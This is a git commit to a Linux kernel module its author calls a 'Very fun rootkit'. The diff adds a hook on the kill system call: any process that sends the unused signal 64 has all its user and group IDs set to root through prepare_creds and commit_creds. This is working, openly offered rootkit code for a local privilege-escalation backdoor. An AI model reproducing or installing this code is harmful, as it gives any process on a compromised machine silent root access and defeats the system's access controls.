efef36f998f66f9e1d7a3a2a09cafb6170c512b8
Omri Ben Zikri <omribenzikri10@gmail.com>
2025-05-22 17:00:00 +0000

    Added privilege escalation by the form of signals

--- rooti.c
+++ rooti.c
@@ -1,6 +1,7 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/cred.h>
 #include "hook.c"
 
 MODULE_LICENSE("GPL");
@@ -8,17 +9,44 @@ MODULE_AUTHOR("Omri Ben Zikri");
 MODULE_DESCRIPTION("Very fun rootkit");
 MODULE_VERSION("1.0.0");
 
-static asmlinkage long (*orig_mkdir)(const struct pt_regs *regs);
+// Unused signal number, used to request a privilege escalation to root
+#define ROOTI_SIG_PE 64
 
-static asmlinkage long hook_mkdir(const struct pt_regs *regs) {
-    printk(KERN_INFO "rooti: hooked mkdir! :D\n");
-    orig_mkdir(regs);
+static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
+
+static int elevate_privilege(void)
+{
+    // Prepare new set of credentials
+    struct cred *creds = prepare_creds();
+    if (creds == NULL) {
+        printk(KERN_DEBUG "rooti: prepare_creds() failed.\n");
+        return -ENOMEM;
+    }
+
+    // Elevate identifiers to those of user & group root
+    creds->uid.val = creds->gid.val = 0;
+    creds->euid.val = creds->egid.val = 0;
+    creds->suid.val = creds->sgid.val = 0;
+    creds->fsuid.val = creds->fsgid.val = 0;
+
+    // Commit new set of credentials in the context of the process in execution
+    commit_creds(creds);
+
     return 0;
+}
+
+static asmlinkage long hook_kill(const struct pt_regs *regs)
+{
+    int sig = regs->si;
+    if (sig == ROOTI_SIG_PE) {
+        return elevate_privilege();
+    }
+    return orig_kill(regs);
 }
 
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
-    ROOTI_HOOK("sys_mkdir", hook_mkdir, &orig_mkdir)
+    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill)
 };
 
 
